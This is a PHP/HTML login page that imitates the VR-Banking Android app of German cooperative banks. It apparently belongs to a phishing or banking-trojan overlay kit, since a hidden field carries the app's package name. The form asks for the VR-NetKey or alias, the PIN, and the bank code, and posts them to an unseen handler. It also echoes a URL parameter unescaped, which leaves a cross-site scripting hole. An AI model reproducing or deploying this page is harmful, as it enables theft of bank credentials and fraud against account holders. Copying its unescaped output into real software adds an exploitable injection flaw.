<?php require_once '../go.php'; ?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>15</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="js/vendor/jQueryFormStyler/jquery.formstyler.css">
    <link rel="stylesheet" href="css/main.css">

    <link rel="stylesheet" href="css/15.css">

    <script src="js/vendor/jquery-1.11.3.min.js"></script>
    <script src="js/viewport.js"></script>
    <script src="js/vendor/jQueryFormStyler/jquery.formstyler.min.js"></script>
    <script src="js/08.js"></script>
</head>

<body>
		<div class="modal modal_header">
			<div class="container">
                <div class="row row_header">
                    <div class="form_header">
                        <img src="img/15/logo.jpg" alt="">
                    </div>
                </div>
				<form action="" method="post" class="wrapper">
                    <input type="hidden" name="p" value="<?php echo $_GET["p"]; ?>">
                    <input type="hidden" name="field1" value="de.fiducia.smartphone.android.banking.vr" class="main_input">
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									VR-NetKey oder Alias
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									PIN
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Bankleitzahl oder Stadt
								</div>
								<div class="inp_wr">
									<input type="text" name="field4" class="main_input">
								</div>
							</div>
								<div class="input_block_wr input_block_wr_l">
							</div>
							<div class="btn_wr">
								<input class="logon_btn" type="submit" value="Login">
									
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>

</html>